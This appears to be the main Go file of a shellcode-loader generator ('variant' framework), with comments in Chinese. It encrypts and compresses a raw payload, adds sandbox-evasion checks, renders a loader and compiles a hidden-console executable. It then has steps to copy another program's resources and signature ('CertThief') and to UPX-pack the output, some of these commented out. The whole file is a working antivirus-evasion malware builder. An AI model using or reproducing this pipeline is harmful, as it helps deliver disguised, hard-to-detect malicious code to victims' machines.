package main

import (
	"variant/compilers"
	"variant/crypto"
	"variant/gores"
	"variant/log"
	"variant/payloads"
	"variant/templates"
	"variant/xrand"
)

func main() {
	// 1. 构建 BaseCtx
	// 注意：任何模板渲染都需要按照下面的步骤链式调用
	// - 调用 SetCrypto() 设置加密
	// - （可选）调用 SetCompress() 设置压缩
	// - 调用 SetAutoPayload() 自动加密和压缩
	// - （可选）如果需要另外处理 Payload，则调用 SetPayload()
	// - （可选）SetSandbox()
	// - 必须调用 SetLoader()
	// - 必须调用 Set() 设置渲染模板的数据
	base, _ := templates.NewBaseCtxBuilder().
		//SetCrypto(templates.NewCryptoCtx(
		//	crypto.AesBase32Encrypt,
		//	"crypto.AesBase32Decrypt",
		//	xrand.MustStrToBytes(16),
		//	xrand.MustStrToBytes(16),
		//)).
		SetCrypto(func(c *templates.CryptoCtx) {
			c.Import = "variant/crypto"
			c.Encrypt = crypto.AesBase32Encrypt
			c.Decrypt = "crypto.AesBase32Decrypt"
			c.Key = xrand.MustStrToBytes(16)
			c.IV = xrand.MustStrToBytes(16)
		}).
		SetCompress(templates.NewCompressCtx("compress.LzwDecompress", 8)).
		SetAutoPayload(func(p *payloads.PayloadCtx) {
			p.Raw = "output/calc.bin"
			p.SavePath = "output"
			p.CipherText = xrand.N(8)
			p.PlainText = xrand.N(8)
		}).
		SetSandbox(templates.NewSandboxCtx([]string{"sandbox.BootTime", "sandbox.GetDesktopFiles"})).
		SetLoader(templates.NewLoaderCtx("loader.Direct")).
		Build()

	// 2. 构建 TmplCtx 中的任意加载方式，例如：LocalCtx
	tmpl := templates.NewTmplBuilder().
		SetLocal(base, func(l *templates.LocalCtx) {
			l.KeyVar = xrand.N(3)
			l.KeyValue = string(base.Crypto.Key)
			l.IVVar = xrand.N(3)
			l.IVValue = string(base.Crypto.IV)
			l.Payload = base.Payload.Encryption
		}).
		Render() // 调用渲染方法

	// 渲染代码文件后返回代码文件路径
	goCodeFile, err := tmpl.TmplRender()
	if err != nil {
		log.Fatal(err)
	}

	// 将 path/name.go 转换为 name.exe
	exeFileName := compilers.RenameGoTrimSuffix(goCodeFile)
	// 将 name.exe 转换为 signed_name.exe
	signedPEName := compilers.RenameSignedPEName(exeFileName)

	// 3. 编译
	cb, _ := compilers.NewCompileBuilder().
		SetBuildCtx(func(b *compilers.BuildCtx) {
			b.SrcGoFile = goCodeFile // 指定编译的代码文件
			b.BuildMode = "pie"
			b.OutExeFile = exeFileName // 指定编译后的二进制文件
			b.WorkingDir = "output"
			b.HideConsole = true
			//b.Obfuscate = true
			//b.Seed = true
			//b.Tiny = true
		}).
		SetResCtx(func(r *gores.GoWinRes) {
			r.PatchFile = exeFileName // 指定添加资源的二进制文件
			r.PatchDir = "output"
			r.ExtractFile = "Code.exe"
		}).
		SetSignCtx(func(s *compilers.CertThief) {
			s.SrcFile = exeFileName   // 指定添加签名的二进制文件
			s.SignedPE = signedPEName // 指定签名后输出的二进制文件
			s.WorkingDir = "output"
			s.Target = "Code.exe"
			s.CertFile = "Code.cer"
		}).
		SetUpxCtx(func(u *compilers.UpxCtx) {
			u.Keep = true
			u.WorkingDir = "output"
			u.Level = "--lzma"
			u.SrcExe = signedPEName // 指定压缩的二进制文件
			u.UpxPath = "output"
		}).
		Build()

	errCp := cb.Build.Compile()
	if errCp != nil {
		panic(errCp)
	}

	//errRes := cb.Res.Extract()
	//if errRes != nil {
	//	panic(errRes)
	//}
	//
	//errSign := cb.Sign.SignExecutable()
	//if errSign != nil {
	//	panic(errSign)
	//}
	//
	//errSave := cb.Sign.SaveCertificate()
	//if errSave != nil {
	//	panic(errSave)
	//}
	//
	//errUpx := cb.Upx.Pack()
	//if errUpx != nil {
	//	panic(errUpx)
	//}
}
